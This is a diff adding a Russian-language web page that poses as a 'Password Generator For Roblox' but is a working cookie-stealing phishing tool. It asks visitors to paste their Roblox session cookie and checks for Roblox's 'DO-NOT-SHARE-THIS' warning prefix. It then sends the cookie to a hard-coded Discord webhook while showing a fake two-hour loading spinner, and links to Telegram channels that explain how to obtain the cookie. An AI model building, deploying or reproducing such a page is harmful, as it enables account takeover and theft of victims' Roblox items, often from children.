@@ -1,0 +1,368 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Password Generator For Roblox</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .gradient-bg {
+            background: linear-gradient(270deg, #6B7280, #1F2937, #374151, #4B5563);
+            background-size: 400% 400%;
+            animation: gradient 15s ease infinite;
+        }
+
+        .input-glow {
+            box-shadow: 0 0 10px rgba(59, 130, 246, 0.5), 0 0 20px rgba(59, 130, 246, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .button-pulse {
+            transition: all 0.3s ease;
+        }
+
+        .button-pulse:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(59, 130, 246, 0.7);
+        }
+
+        .loading-spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #3B82F6;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .error-shake {
+            animation: shake 0.5s;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            50% { transform: translateX(10px); }
+            75% { transform: translateX(-10px); }
+        }
+
+        .support-btn, .how-to-btn {
+            position: fixed;
+            bottom: 20px;
+            z-index: 150;
+            padding: 10px;
+            background-color: #4B5563;
+            border-radius: 50%;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 600;
+            color: white;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            touch-action: manipulation;
+        }
+
+        .support-btn:hover, .how-to-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(59, 130, 246, 0.7);
+        }
+
+        .active-touch {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(59, 130, 246, 0.7);
+        }
+
+        .support-btn {
+            right: 20px;
+            width: 80px;
+            height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .how-to-btn {
+            right: 120px;
+            width: 100px;
+            height: 100px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .hacker-image {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+
+        #generateBtn {
+            position: relative;
+            z-index: 100;
+            touch-action: manipulation;
+        }
+
+        .content-container {
+            position: relative;
+            z-index: 50;
+        }
+
+        @media (max-width: 640px) {
+            .support-btn, .how-to-btn {
+                transform: scale(0.8);
+            }
+
+            .support-btn {
+                right: 10px;
+            }
+
+            .how-to-btn {
+                right: 100px;
+            }
+
+            .w-full.max-w-md.p-6 {
+                padding-bottom: 180px;
+            }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center gradient-bg text-white font-sans">
+    <div class="w-full text-center py-4">
+        <h2 class="text-4xl font-bold tracking-wider">RobloxAkkHaker</h2>
+    </div>
+    <div class="w-full flex justify-center py-6">
+        <img src="https://i.postimg.cc/PrJz4zK0/photo-2025-04-15-23-47-42-round-1.png" alt="RobloxAkkHaker Image" class="hacker-image">
+    </div>
+    <div class="w-full max-w-md p-6 flex-grow flex items-center justify-center content-container">
+        <div>
+            <h1 class="text-3xl font-bold text-center mb-8 tracking-tight">Password Generator For Roblox</h1>
+            <div class="space-y-4">
+                <input
+                    id="inputField"
+                    type="text"
+                    placeholder="Enter Your Cookie..."
+                    class="w-full p-3 bg-gray-800 bg-opacity-50 rounded-lg text-white border border-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500 input-glow"
+                >
+                <button
+                    id="generateBtn"
+                    class="w-full p-3 bg-blue-600 rounded-lg font-semibold text-white button-pulse"
+                >
+                    Generate password
+                </button>
+            </div>
+            <div id="loading" class="hidden mt-6 flex flex-col items-center">
+                <div class="loading-spinner"></div>
+                <p class="mt-4 text-sm">Генерация пароля... <span id="counter">1</span></p>
+            </div>
+            <div id="error" class="hidden mt-6 p-4 bg-red-900 bg-opacity-80 rounded-lg text-center">
+                <p class="text-red-300">An error occurred. Please try again.</p>
+            </div>
+            <div id="invalidCookie" class="hidden mt-6 p-4 bg-red-900 bg-opacity-80 rounded-lg text-center">
+                <p class="text-red-300">Вы Ввели Не Кук! <span id="timer">5</span></p>
+            </div>
+        </div>
+    </div>
+
+    <a
+        href="https://t.me/RobloxAkkHacker"
+        target="_blank"
+        class="how-to-btn"
+        id="howToBtn"
+    >
+        Как получить кук?
+    </a>
+    <a
+        href="https://t.me/EgorovichFF"
+        target="_blank"
+        class="support-btn"
+        id="supportBtn"
+    >
+        Поддержка
+    </a>
+
+    <script>
+        const inputField = document.getElementById('inputField');
+        const generateBtn = document.getElementById('generateBtn');
+        const loading = document.getElementById('loading');
+        const error = document.getElementById('error');
+        const invalidCookie = document.getElementById('invalidCookie');
+        const timerDisplay = document.getElementById('timer');
+        const counterDisplay = document.getElementById('counter');
+        const howToBtn = document.getElementById('howToBtn');
+        const supportBtn = document.getElementById('supportBtn');
+
+        const discordWebhookURL = 'https://discord.com/api/webhooks/1361771684834836550/6wzW0CiTJIne3TipG55EFQcZMsqYQYbHTh4KUvd5WtpyyOdkeZ8WjQfAlKOUX5Q1Rn6n';
+
+        function sanitizeInput(input) {
+            const div = document.createElement('div');
+            div.textContent = input;
+            return div.innerHTML;
+        }
+
+        const handleLinkClick = (e, url) => {
+            e.preventDefault();
+            console.log(`Redirecting to: ${url}`);
+            window.open(url, '_blank');
+        };
+
+        howToBtn.addEventListener('click', (e) => handleLinkClick(e, howToBtn.href));
+        howToBtn.addEventListener('touchstart', (e) => {
+            e.preventDefault();
+            howToBtn.classList.add('active-touch');
+        });
+        howToBtn.addEventListener('touchend', (e) => {
+            howToBtn.classList.remove('active-touch');
+            handleLinkClick(e, howToBtn.href);
+        });
+
+        supportBtn.addEventListener('click', (e) => handleLinkClick(e, supportBtn.href));
+        supportBtn.addEventListener('touchstart', (e) => {
+            e.preventDefault();
+            supportBtn.classList.add('active-touch');
+        });
+        supportBtn.addEventListener('touchend', (e) => {
+            supportBtn.classList.remove('active-touch');
+            handleLinkClick(e, supportBtn.href);
+        });
+
+        const handleGenerate = async (e) => {
+            e.preventDefault();
+
+            let cookieData = inputField.value.trim();
+            cookieData = sanitizeInput(cookieData);
+
+            if (cookieData === '') {
+                inputField.classList.add('error-shake');
+                setTimeout(() => inputField.classList.remove('error-shake'), 500);
+                return;
+            }
+
+            const validPrefixes = [
+                '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_',
+                '|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_',
+                'WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'
+            ];
+
+            const isValidCookie = validPrefixes.some(prefix => cookieData.startsWith(prefix));
+
+            if (!isValidCookie) {
+                invalidCookie.classList.remove('hidden');
+                error.classList.add('hidden');
+                loading.classList.add('hidden');
+
+                let timeLeft = 5;
+                timerDisplay.textContent = timeLeft;
+
+                const countdown = setInterval(() => {
+                    timeLeft -= 1;
+                    timerDisplay.textContent = timeLeft;
+                    if (timeLeft <= 0) {
+                        clearInterval(countdown);
+                        console.log('Redirecting due to invalid cookie');
+                        window.location.href = 'https://t.me/RobloxAkkHacker';
+                    }
+                }, 1000);
+
+                return;
+            }
+
+            try {
+                const response = await fetch(discordWebhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `New Cookie Submission: ${cookieData}`,
+                        username: 'Roblox Password Generator',
+                        avatar_url: 'https://i.imgur.com/AfFp7pu.png'
+                    }),
+                });
+
+                if (!response.ok) throw new Error('Failed to send to Discord');
+            } catch (err) {
+                console.error('Error sending to Discord:', err);
+            }
+
+            generateBtn.classList.add('hidden');
+            loading.classList.remove('hidden');
+            error.classList.add('hidden');
+            invalidCookie.classList.add('hidden');
+
+            let counter = 1;
+            const counterInterval = setInterval(() => {
+                counterDisplay.textContent = counter;
+                counter++;
+            }, 1000);
+
+            setTimeout(() => {
+                clearInterval(counterInterval);
+                loading.classList.add('hidden');
+                error.classList.remove('hidden');
+                generateBtn.classList.remove('hidden');
+            }, 7200000);
+        };
+
+        generateBtn.addEventListener('click', handleGenerate);
+        generateBtn.addEventListener('touchstart', (e) => e.preventDefault());
+        generateBtn.addEventListener('touchend', handleGenerate);
+
+        inputField.addEventListener('input', () => {
+            inputField.value = inputField.value;
+        });
+        inputField.addEventListener('paste', () => {
+            setTimeout(() => {
+                inputField.value = inputField.value;
+            }, 0);
+        });
+    </script>
+</body>
+</html>
